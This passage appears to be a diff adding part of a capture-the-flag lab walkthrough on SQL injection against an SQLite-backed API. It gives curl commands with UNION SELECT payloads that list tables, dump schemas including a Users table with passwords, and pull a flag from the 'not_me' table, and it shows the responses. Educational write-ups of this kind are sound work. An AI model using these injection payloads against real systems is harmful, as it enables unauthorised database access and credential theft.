@@ -211,6 +211,154 @@ git commit -m "1-flag.txt"
 git push
 ```
 
+**Note**:
+> The response identifies SQLite as the database engine. SQLite doesn't normally implement `version()`, so this appears to be a custom function provided by the challenge. SQLite's native version function is `sqlite_version()`.
 
 
+
+### Next step: Enumerate database tables
+
+SQLite stores database schema information in a special table called `sqlite_master` (also accessible as `sqlite_schema`).
+
+We can query it to retrieve table names.
+
+Execute this one command:
+
+```bash
+curl -sG "$URL" \
+  --data-urlencode "status=paid' UNION SELECT NULL,NULL,NULL,group_concat(name, ', '),NULL FROM sqlite_master WHERE type='table'-- " | jq .
+
+[
+  [
+    null,
+    null,
+    null,
+    "Orders, RandomTable1, RandomTable2, RandomTable3, RandomTable4, RandomTable5, RandomTable6, RandomTable7, RandomTable8, RandomTable9, RandomTable10, not_me, Users",
+    null
+  ],
+```
+
+What it does:
+
+- `sqlite_master`: accesses SQLite's schema catalog.
+- `WHERE type='table'`: selects only table definitions.
+- `name`: retrieves each table's name.
+- `group_concat(name, ', ')`: combines all table names into one string.
+- `UNION SELECT`: injects that string into the fourth output column.
+
+
+## Task 2. SQLi - Data Exfiltration from a Specific Table
+
+With knowledge of the database structure, your goal is to extract sensitive data from a specific table.\
+The target for this exercise is a flag ⛳️ stored within one of the tables you previously identified.
+
+---
+
+
+Helpful Instructions:
+
+1. Based on your findings from Task 1, choose a table that likely contains the flag.
+2. Develop payloads that will allow you to retrieve the contents of the target table.
+
+- This will involve constructing queries that utilize **`UNION`**` `**`SELECT`** statements or other techniques suitable for data exfiltration.
+
+
+## **Solution**:
+
+We successfully enumerated 13 tables in the SQLite database:
+
+`Orders`, `RandomTable1`, . . . , `RandomTable10`, `not_me`, and `Users`.
+
+For Task 2: SQLi - Data Exfiltration, we need to determine which table contains the flag.
+
+Rather than blindly extracting data from all 13 tables, we'll first inspect their schemas.
+
+### Discover the columns in each table
+
+SQLite stores table definitions in `sqlite_master`, including the original `CREATE TABLE` statements.
+
+Executing this command:
+
+```bash
+curl -sG "$URL" \
+  --data-urlencode "status=paid' UNION SELECT NULL,NULL,NULL,group_concat(name || ': ' || sql, char(10)),NULL FROM sqlite_master WHERE type='table'-- " | jq .
+
+#[
+#  [
+#    null,
+#    null,
+#    null,
+#    "Orders: CREATE TABLE Orders (\n    id INTEGER PRIMARY KEY,\n    date TEXT,\n    status TEXT,\n    customer_name TEXT,\n    customer_email TEXT\n)\nRandomTable1: CREATE TABLE RandomTable1 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable2: CREATE TABLE RandomTable2 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable3: CREATE TABLE RandomTable3 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable4: CREATE TABLE RandomTable4 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable5: CREATE TABLE RandomTable5 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable6: CREATE TABLE RandomTable6 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable7: CREATE TABLE RandomTable7 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable8: CREATE TABLE RandomTable8 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable9: CREATE TABLE RandomTable9 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable10: CREATE TABLE RandomTable10 (id INTEGER PRIMARY KEY, value TEXT)\nnot_me: CREATE TABLE not_me (\n    id INTEGER,\n    value TEXT,\n    name TEXT\n)\nUsers: CREATE TABLE Users (\n    id INTEGER PRIMARY KEY,\n    name VARCHAR(120),\n    username VARCHAR(120) UNIQUE,\n    password TEXT\n)",
+#     null
+#   ],
+```
+
+### How it works
+
+- `sqlite_master`: SQLite's internal schema catalog.
+- `name`: The table name.
+- `sql`: The SQL statement used to create the table, including its column names and types.
+- `||`: SQLite's string concatenation operator.
+- `char(10)`: A newline character.
+- `group_concat(...)`: Combines the schema definitions into one result.
+- `UNION SELECT`: Places the schema information into the fourth column of the API response.
+
+We discovered table structures:
+
+```sql
+Orders: CREATE TABLE Orders (
+    id INTEGER PRIMARY KEY,
+    date TEXT,
+    status TEXT,
+    customer_name TEXT,
+    customer_email TEXT
+)
+RandomTable1: CREATE TABLE RandomTable1 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable2: CREATE TABLE RandomTable2 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable3: CREATE TABLE RandomTable3 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable4: CREATE TABLE RandomTable4 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable5: CREATE TABLE RandomTable5 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable6: CREATE TABLE RandomTable6 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable7: CREATE TABLE RandomTable7 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable8: CREATE TABLE RandomTable8 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable9: CREATE TABLE RandomTable9 (id INTEGER PRIMARY KEY, value TEXT)
+RandomTable10: CREATE TABLE RandomTable10 (id INTEGER PRIMARY KEY, value TEXT)
+not_me: CREATE TABLE not_me (
+    id INTEGER,
+    value TEXT,
+    name TEXT
+)
+Users: CREATE TABLE Users (
+    id INTEGER PRIMARY KEY,
+    name VARCHAR(120),
+    username VARCHAR(120) UNIQUE,
+    password TEXT
+)
+```
+
+
+### Inspecting the `not_me` table
+
+Let's start with `not_me` table because its structure differs from the other tables.
+
+```bash
+curl -sG "$URL" \
+  --data-urlencode "status=paid' AND 1=0 UNION SELECT NULL,NULL,NULL,name || ': ' || value,NULL FROM not_me-- " | jq .
+# [
+#   [
+#     null,
+#     null,
+#     null,
+#     "FLAG: acc05fbd64eb50cfb692da28efc313e9",
+#     null
+#   ]
+# ]
+```
+
+```bash
+echo "acc05fbd64eb50cfb692da28efc313e9" > 2-flag.txt
+git add .
+git commit -m "2-flag.txt"
+git push
+```
 
